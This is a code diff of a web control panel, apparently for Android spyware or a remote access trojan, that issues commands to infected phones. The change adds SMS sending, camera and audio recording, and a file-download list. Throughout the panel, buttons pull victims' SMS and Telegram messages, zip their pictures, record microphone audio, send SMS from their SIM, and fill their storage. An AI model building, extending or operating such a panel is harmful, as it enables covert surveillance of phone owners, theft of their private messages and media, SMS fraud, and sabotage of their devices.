@@ -13,7 +13,7 @@
             padding: 20px; 
             min-height: 100vh;
         }
-        .container { max-width: 1100px; margin: 0 auto; }
+        .container { max-width: 1200px; margin: 0 auto; }
         .header {
             display: flex;
             justify-content: space-between;
@@ -166,51 +166,44 @@
             align-items: center;
             gap: 8px;
         }
-        /* ===== ФУНКЦИОНАЛЬНОЕ ОКНО ===== */
-        .function-modal {
+
+        .modal-overlay {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             backdrop-filter: blur(8px);
             z-index: 9998;
             justify-content: center;
             align-items: center;
-            animation: fadeModal 0.3s ease;
         }
-        .function-modal.active { display: flex; }
-        @keyframes fadeModal {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .function-modal-content {
+        .modal-overlay.active { display: flex; }
+        .modal-content {
             background: #14102a;
             border: 1px solid #3a2a5a;
             border-radius: 20px;
             padding: 30px;
-            max-width: 800px;
+            max-width: 900px;
             width: 95%;
-            max-height: 85vh;
+            max-height: 90vh;
             overflow-y: auto;
             position: relative;
             box-shadow: 0 20px 60px rgba(124, 58, 237, 0.3);
         }
-        .function-modal-content .close-btn {
-            position: absolute;
-            top: 12px;
-            right: 16px;
+        .modal-content .close-btn {
+            position: sticky;
+            top: 0;
+            float: right;
             background: none;
             border: none;
             color: #6a5a7a;
             font-size: 28px;
             cursor: pointer;
             transition: 0.2s;
+            z-index: 10;
         }
-        .function-modal-content .close-btn:hover { 
-            color: #f87171;
-            transform: rotate(90deg);
-        }
-        .function-modal-content .modal-title {
+        .modal-content .close-btn:hover { color: #f87171; transform: rotate(90deg); }
+        .modal-content .modal-title {
             font-size: 22px;
             font-weight: 600;
             color: #a78bfa;
@@ -218,12 +211,14 @@
             padding-bottom: 12px;
             border-bottom: 1px solid #2a1f4a;
         }
-        .function-modal-content .modal-body {
+        .modal-content .modal-body {
             color: #d0c6e8;
             font-size: 14px;
             line-height: 1.6;
+            max-height: 60vh;
+            overflow-y: auto;
         }
-        .function-modal-content .modal-body .file-link {
+        .modal-content .modal-body .file-link {
             display: block;
             background: #2a1f4a;
             padding: 12px 16px;
@@ -234,11 +229,11 @@
             border: 1px solid #3a2a5a;
             transition: 0.2s;
         }
-        .function-modal-content .modal-body .file-link:hover {
+        .modal-content .modal-body .file-link:hover {
             background: #3a2a5a;
             border-color: #7c3aed;
         }
-        .function-modal-content .modal-body pre {
+        .modal-content .modal-body pre {
             background: #0d0a1a;
             padding: 16px;
             border-radius: 10px;
@@ -250,13 +245,22 @@
             overflow-y: auto;
             white-space: pre-wrap;
             word-wrap: break-word;
+            font-family: 'Consolas', monospace;
         }
-        .function-modal-content .modal-body .status-msg {
+        .modal-content .modal-body .status-msg {
             padding: 10px 16px;
             border-radius: 8px;
             margin: 10px 0;
             background: #1a1a2a;
             border-left: 3px solid #7c3aed;
+        }
+        .modal-content .modal-body .status-msg.error {
+            border-left-color: #f87171;
+            color: #f87171;
+        }
+        .modal-content .modal-body .status-msg.success {
+            border-left-color: #6ee7a7;
+            color: #6ee7a7;
         }
         .btn-close-modal {
             margin-top: 16px;
@@ -274,14 +278,67 @@
             background: #3a2a5a;
             border-color: #7c3aed;
         }
-        .recording-indicator {
-            color: #f87171;
-            animation: pulse 1s infinite;
+        .btn-download {
+            background: #7c3aed;
+            border: none;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: 0.2s;
+            text-decoration: none;
+            display: inline-block;
         }
+        .btn-download:hover { background: #6d28d9; transform: scale(1.02); }
+        .recording-indicator { color: #f87171; animation: pulse 1s infinite; }
+        .file-item {
+            background: #1a1a2a;
+            padding: 10px 14px;
+            border-radius: 10px;
+            margin: 6px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #2a1f4a;
+        }
+        .file-item .filename { color: #a78bfa; }
+        .file-item .filetime { color: #6a5a7a; font-size: 12px; }
+        .sms-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 12px;
+        }
+        .sms-form input, .sms-form select, .sms-form textarea {
+            background: #0d0a1a;
+            border: 1px solid #2a1f4a;
+            border-radius: 8px;
+            padding: 10px;
+            color: #d0c6e8;
+            font-size: 14px;
+            font-family: inherit;
+        }
+        .sms-form input:focus, .sms-form select:focus, .sms-form textarea:focus {
+            border-color: #7c3aed;
+            outline: none;
+        }
+        .sms-form textarea { min-height: 80px; resize: vertical; }
+        .sms-form .btn-send {
+            background: #7c3aed;
+            border: none;
+            color: #fff;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+        .sms-form .btn-send:hover { background: #6d28d9; }
         @media (max-width: 600px) {
             .device-top { flex-direction: column; align-items: flex-start; }
             .menu-grid { grid-template-columns: repeat(2, 1fr); }
-            .function-modal-content { padding: 20px; }
+            .modal-content { padding: 16px; }
         }
     </style>
 </head>
@@ -294,39 +351,34 @@
     <div id="devices">loading...</div>
 </div>
 
-<!-- МОДАЛЬНОЕ ОКНО ДЛЯ ФУНКЦИЙ -->
-<div class="function-modal" id="functionModal">
-    <div class="function-modal-content">
-        <button class="close-btn" onclick="closeFunctionModal()">✕</button>
-        <div class="modal-title" id="modalTitle">Function</div>
-        <div class="modal-body" id="modalBody">
-            <div class="status-msg">loading...</div>
-        </div>
-        <button class="btn-close-modal" onclick="closeFunctionModal()">close</button>
+<div class="modal-overlay" id="modalOverlay">
+    <div class="modal-content">
+        <button class="close-btn" onclick="closeModal()">✕</button>
+        <div class="modal-title" id="modalTitle">function</div>
+        <div class="modal-body" id="modalBody"></div>
+        <button class="btn-close-modal" onclick="closeModal()">close</button>
     </div>
 </div>
 
 <script>
     let activeDeviceId = null;
     let recordingStates = {};
+    let currentDeviceId = null;
 
-    // ===== МОДАЛЬНОЕ ОКНО =====
-    function openFunctionModal(title, content) {
+    function openModal(title, content) {
         document.getElementById('modalTitle').textContent = title;
         document.getElementById('modalBody').innerHTML = content;
-        document.getElementById('functionModal').classList.add('active');
+        document.getElementById('modalOverlay').classList.add('active');
     }
 
-    function closeFunctionModal() {
-        document.getElementById('functionModal').classList.remove('active');
+    function closeModal() {
+        document.getElementById('modalOverlay').classList.remove('active');
     }
 
-    // Закрытие по клику вне окна
-    document.getElementById('functionModal').addEventListener('click', function(e) {
-        if (e.target === this) closeFunctionModal();
+    document.getElementById('modalOverlay').addEventListener('click', function(e) {
+        if (e.target === this) closeModal();
     });
 
-    // ===== ОСНОВНЫЕ ФУНКЦИИ =====
     function toggleMenu(deviceId) {
         const panel = document.getElementById('menu-' + deviceId);
         const icon = document.querySelector(`.device[data-id="${deviceId}"] .expand-icon`);
@@ -343,142 +395,159 @@
         }
     }
 
-    function sendCommand(deviceId, command, btn) {
-        if (btn) {
-            btn.disabled = true;
-            btn.textContent = '...';
-            btn.style.opacity = '0.6';
+    function sendCommand(deviceId, command, data) {
+        const payload = { deviceId, command };
+        if (data) payload.data = data;
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
+
+    // ===== ФУНКЦИИ МОДАЛЬНЫХ ОКОН =====
+
+    function showSMS(deviceId) {
+        openModal('send sms', `
+            <div class="sms-form">
+                <select id="smsSim">
+                    <option value="0">sim 1</option>
+                    <option value="1">sim 2</option>
+                </select>
+                <input type="text" id="smsNumber" placeholder="phone number" />
+                <textarea id="smsText" placeholder="message content"></textarea>
+                <button class="btn-send" onclick="sendSMS('${deviceId}')">send sms</button>
+                <div id="smsStatus" style="margin-top:8px;color:#6a5a7a;font-size:13px;"></div>
+            </div>
+        `);
+    }
+
+    function sendSMS(deviceId) {
+        const number = document.getElementById('smsNumber').value;
+        const text = document.getElementById('smsText').value;
+        const sim = document.getElementById('smsSim').value;
+        if (!number || !text) {
+            document.getElementById('smsStatus').textContent = '⚠️ fill all fields';
+            return;
         }
-        fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId, command })
-        })
-        .then(() => {
-            openFunctionModal('command sent', `
-                <div class="status-msg">✓ command "${command}" sent to device</div>
-                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">the device will execute the command shortly</div>
-            `);
-        })
-        .catch(() => {
-            openFunctionModal('error', `
-                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to send command</div>
-            `);
-        })
-        .finally(() => {
-            if (btn) {
-                btn.disabled = false;
-                btn.textContent = getButtonLabel(command);
-                btn.style.opacity = '1';
-            }
-        });
+        sendCommand(deviceId, 'send_sms', JSON.stringify({ number, text, sim }));
+        document.getElementById('smsStatus').textContent = '✅ sms sending...';
     }
 
-    // ===== СПЕЦИАЛЬНЫЕ ФУНКЦИИ (С ОТДЕЛЬНЫМ ОКНОМ) =====
-    function getSMS(deviceId) {
-        openFunctionModal('sms (last 5)', `
-            <div class="status-msg">⏳ requesting sms...</div>
-        `);
-        fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId, command: 'sms' })
-        })
-        .then(() => {
-            openFunctionModal('sms (last 5)', `
-                <div class="status-msg">✓ command sent, waiting for response...</div>
-                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">sms will appear here when received</div>
-            `);
-        })
-        .catch(() => {
-            openFunctionModal('error', `
-                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to request sms</div>
-            `);
-        });
-    }
-
-    function getTgMsgs(deviceId, count) {
-        const cmd = count === 30 ? 'tgsms30' : 'tgsms1000';
-        const label = count === 30 ? 'telegram (30)' : 'telegram (1000)';
-        openFunctionModal(label, `
+    function showMessages(deviceId, count) {
+        const title = count === 30 ? 'telegram (30)' : 'telegram (1000)';
+        openModal(title, `
             <div class="status-msg">⏳ requesting ${count} messages...</div>
+            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">
+                ${count === 1000 ? 'will be delivered as file' : 'messages will appear here'}
+            </div>
         `);
-        fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId, command: cmd })
-        })
-        .then(() => {
-            openFunctionModal(label, `
-                <div class="status-msg">✓ command sent, waiting for response...</div>
-                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">
-                    ${count === 1000 ? 'will be delivered as file download' : 'messages will appear here'}
-                </div>
-            `);
-        })
-        .catch(() => {
-            openFunctionModal('error', `
-                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to request messages</div>
-            `);
-        });
+        sendCommand(deviceId, count === 30 ? 'tgsms30' : 'tgsms1000');
     }
 
-    function getPictures(deviceId) {
-        openFunctionModal('pictures zip', `
+    function showPictures(deviceId) {
+        openModal('pictures zip', `
             <div class="status-msg">⏳ creating archive...</div>
             <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">this may take a moment</div>
         `);
-        fetch('/api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId, command: 'pictures' })
-        })
-        .then(() => {
-            openFunctionModal('pictures zip', `
-                <div class="status-msg">✓ archive requested, will be sent as file</div>
-                <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">check your downloads when ready</div>
-            `);
-        })
-        .catch(() => {
-            openFunctionModal('error', `
-                <div class="status-msg" style="border-left-color:#f87171;color:#f87171;">✗ failed to request archive</div>
-            `);
-        });
+        sendCommand(deviceId, 'pictures');
     }
 
-    function toggleRecording(deviceId, btn) {
+    function showFiles(deviceId) {
+        openModal('files', `<div class="status-msg">loading files...</div>`);
+        fetch('/api/files/' + deviceId)
+            .then(res => res.json())
+            .then(files => {
+                if (!files || files.length === 0) {
+                    document.getElementById('modalBody').innerHTML = `<div class="status-msg">no files</div>`;
+                    return;
+                }
+                let html = `<div style="margin-bottom:12px;">total: ${files.length} files</div>`;
+                files.forEach(f => {
+                    html += `
+                        <div class="file-item">
+                            <span class="filename">📄 ${f.filename}</span>
+                            <span class="filetime">${new Date(f.created_at).toLocaleString()}</span>
+                            <a href="/api/download/${deviceId}/${f.filename}" class="btn-download" download>⬇ download</a>
+                        </div>
+                    `;
+                });
+                document.getElementById('modalBody').innerHTML = html;
+            })
+            .catch(() => {
+                document.getElementById('modalBody').innerHTML = `<div class="status-msg error">error loading files</div>`;
+            });
+    }
+
+    function showCamera(deviceId) {
+        openModal('camera', `
+            <div class="status-msg">⏳ requesting camera stream...</div>
+            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">camera feed will appear here when available</div>
+            <div style="margin-top:12px;">
+                <button class="btn btn-primary" onclick="sendCommand('${deviceId}', 'camera_start')">start camera</button>
+                <button class="btn btn-danger" onclick="sendCommand('${deviceId}', 'camera_stop')">stop camera</button>
+            </div>
+        `);
+    }
+
+    function showVolumeMenu(deviceId) {
+        openModal('volume control', `
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;">
+                <button class="btn btn-primary" onclick="sendCommand('${deviceId}','lock_volume');closeModal();">lock volume</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','unlock_volume');closeModal();">unlock volume</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_normal');closeModal();">normal mode</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_silent');closeModal();">silent mode</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_max');closeModal();">max volume</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_min');closeModal();">min volume</button>
+            </div>
+        `);
+    }
+
+    function showRecording(deviceId) {
         const isRecording = recordingStates[deviceId] || false;
-        if (isRecording) {
-            sendCommand(deviceId, 'voice_stop', btn);
-            recordingStates[deviceId] = false;
-            btn.textContent = 'record';
-            btn.className = 'btn btn-danger';
-        } else {
-            sendCommand(deviceId, 'voice_start', btn);
-            recordingStates[deviceId] = true;
-            btn.textContent = 'stop';
-            btn.className = 'btn btn-recording';
-        }
+        openModal('audio recording', `
+            <div style="text-align:center;padding:20px 0;">
+                <div style="font-size:48px;margin-bottom:12px;">${isRecording ? '🔴' : '🎙'}</div>
+                <div style="font-size:16px;margin-bottom:16px;color:#a78bfa;">
+                    ${isRecording ? 'recording in progress...' : 'ready to record'}
+                </div>
+                <button class="btn ${isRecording ? 'btn-recording' : 'btn-danger'}" 
+                        onclick="toggleRecordingFromModal('${deviceId}')" id="recordBtn">
+                    ${isRecording ? 'stop recording' : 'start recording'}
+                </button>
+                <div id="recordingStatus" style="margin-top:12px;color:#6a5a7a;font-size:13px;"></div>
+            </div>
+        `);
+        // После закрытия обновляем состояние
+        const origClose = closeModal;
+        window.closeModal = function() {
+            if (recordingStates[deviceId]) {
+                sendCommand(deviceId, 'voice_stop');
+                recordingStates[deviceId] = false;
+            }
+            origClose();
+        };
     }
 
-    function getButtonLabel(cmd) {
-        const labels = {
-            'reboot': 'reboot',
-            'shutdown': 'shutdown',
-            'collect': 'data',
-            'pictures': 'pictures zip',
-            'lock_volume': 'lock volume',
-            'unlock_volume': 'unlock volume',
-            'wifi_toggle': 'wifi',
-            'airplane': 'airplane',
-            'wallpaper': 'wallpaper',
-            'sms': 'sms (5)',
-            'tgsms30': 'tg (30)',
-            'tgsms1000': 'tg (1000)',
-            'fill_storage': 'fill storage',
-            'clean_storage': 'clean storage'
-        };
-        return labels[cmd] || cmd;
+    function toggleRecordingFromModal(deviceId) {
+        const isRecording = recordingStates[deviceId] || false;
+        const btn = document.getElementById('recordBtn');
+        const status = document.getElementById('recordingStatus');
+        if (isRecording) {
+            sendCommand(deviceId, 'voice_stop');
+            recordingStates[deviceId] = false;
+            btn.textContent = 'start recording';
+            btn.className = 'btn btn-danger';
+            status.textContent = '✅ recording stopped, file will be available in files';
+            // Обновляем список файлов
+            setTimeout(() => showFiles(deviceId), 2000);
+        } else {
+            sendCommand(deviceId, 'voice_start');
+            recordingStates[deviceId] = true;
+            btn.textContent = 'stop recording';
+            btn.className = 'btn btn-recording';
+            status.textContent = '🔴 recording...';
+        }
     }
 
     function getBatteryClass(level) {
@@ -487,7 +556,6 @@
         return 'low';
     }
 
-    // ===== ОБНОВЛЕНИЕ УСТРОЙСТВ =====
     function fetchDevices() {
         fetch('/api/devices')
             .then(res => res.json())
@@ -531,24 +599,22 @@
                             <div class="menu-panel" id="menu-${d.id}">
                                 <div class="menu-title">▸ control panel</div>
                                 <div class="menu-grid">
-                                    <button class="btn btn-primary" onclick="event.stopPropagation(); sendCommand('${d.id}', 'reboot', this)">reboot</button>
-                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}', 'shutdown', this)">shutdown</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'collect', this)">data</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getPictures('${d.id}')">pictures zip</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'lock_volume', this)">lock volume</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'unlock_volume', this)">unlock volume</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'wifi_toggle', this)">wifi</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'airplane', this)">airplane</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'wallpaper', this)">wallpaper</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getSMS('${d.id}')">sms (5)</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getTgMsgs('${d.id}', 30)">tg (30)</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); getTgMsgs('${d.id}', 1000)">tg (1000)</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'fill_storage', this)">fill storage</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'clean_storage', this)">clean storage</button>
-                                    <button class="btn ${isRecording ? 'btn-recording' : 'btn-danger'}" 
-                                            onclick="event.stopPropagation(); toggleRecording('${d.id}', this)">
-                                        ${isRecording ? 'stop' : 'record'}
-                                    </button>
+                                    <button class="btn btn-primary" onclick="event.stopPropagation(); sendCommand('${d.id}','reboot');">reboot</button>
+                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}','shutdown');">shutdown</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','collect');">data</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showPictures('${d.id}')">pictures zip</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showVolumeMenu('${d.id}')">volume</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wifi_toggle');">wifi</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','airplane');">airplane</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wallpaper');">wallpaper</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showSMS('${d.id}')">send sms</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showMessages('${d.id}', 30)">tg (30)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showMessages('${d.id}', 1000)">tg (1000)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showFiles('${d.id}')">files</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showRecording('${d.id}')">audio rec</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); showCamera('${d.id}')">camera</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','fill_storage');">fill storage</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','clean_storage');">clean storage</button>
                                 </div>
                             </div>
                         </div>
@@ -560,7 +626,6 @@
             });
     }
 
-    // ===== ЖИВОЕ ОБНОВЛЕНИЕ =====
     setInterval(fetchDevices, 5000);
     fetchDevices();
 </script>
